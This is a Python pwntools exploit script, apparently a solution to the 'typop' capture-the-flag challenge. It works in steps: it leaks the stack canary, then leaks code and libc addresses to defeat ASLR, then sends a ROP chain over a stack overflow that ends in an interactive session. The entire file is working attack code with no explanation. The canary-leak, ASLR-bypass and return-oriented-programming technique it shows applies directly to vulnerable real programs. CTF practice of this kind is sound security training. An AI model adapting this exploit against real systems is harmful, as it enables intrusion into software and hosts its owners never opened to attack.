#!/usr/bin/python2

from pwn import *
import time

exe = ELF("chall_patched")
libc = ELF("libc-2.31.so")



context.binary = exe
pop_rdi = 0x00000000000014d3 #: pop rdi ; ret
pop_rsi = 0x00000000000014d1 #: pop rsi ; pop r15 ; ret
puts_got = 0x03f90
puts_plt =  0x10d0
restart = 0x1160
system_offset = 0x45000
str_bin_sh = 0x18c338
puts_libc = 0x084420
read = 0x1104 

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("typop.chal.idek.team", 1337)
        #r = remote("localhost", 9999)

    return r


def main():
    r = conn()

    r.sendlineafter("?\n", "y")
    r.sendlineafter("?\n", "y"+"A"*9)
    r.recvuntil('A\n')
    canary = "\x00" + r.recv(7)
    print len(canary)
    canary = u64(canary)
    print hex(canary)
    # print "canary: ".format(hex(canary))
    #gdb.attach(r)
    payload = "A"*10
    payload += p64(canary)
    #payload += "A"*8
    #payload += "BBBBBBBB"
    r.sendlineafter('?\n',payload)
    #gdb.attach(r)


    r.sendlineafter("?\n", "y")
#    gdb.attach(r)
    r.sendlineafter("?\n", "y"+"A"*25)
    r.recvuntil('A\n')
    aslr = "\x00" + r.recv(6)[:-1] + "\x00\x00" 
    aslr = u64(aslr)-0x1400
    print hex(aslr)

    payload = "A"*10
    payload += p64(canary)
    payload += p64(0)
    payload += p64(aslr+restart)
    r.sendlineafter('?\n',payload)


    r.sendlineafter("?\n", "y")

    r.sendlineafter("?\n", "y"+"A"*17)
    r.recvuntil('A\n')

    rbp_leak = "\x00" + r.recv(6)[:-1] + "\x00\x00" 
    print rbp_leak
    rbp = u64(rbp_leak)
    print hex(rbp)


    payload = "A"*10
    payload += p64(canary)
    payload += p64(0)
    payload += p64(aslr+pop_rdi)
    payload += p64(aslr+puts_got)
    payload += p64(aslr+puts_plt)
    payload += p64(aslr+restart)
    r.sendlineafter('?\n',payload)


    puts = u64(r.recv(6) + "\x00\x00")
    print hex(puts)
    libc_base = puts - puts_libc
    print hex(libc_base)
    r.sendlineafter("?\n", "y")
    r.sendlineafter("?\n", "y")
    #gdb.attach(r)
    payload = "A"*10
    payload += p64(canary)
    payload += p64(0)
    payload += p64(aslr+pop_rsi)
    payload += p64(0x6c)
    payload += p64(0)
    payload += p64(aslr+pop_rdi)
    payload += p64(0x66)
    payload += p64(libc_base+0x0000000000142c92)
    payload += p64(0x61)
    payload += p64(aslr+0x1249)
    #gdb.attach(r)
    #raw_input()
    r.sendlineafter('?\n',payload)

    r.interactive()

if __name__ == "__main__":
    #while True:
    main()
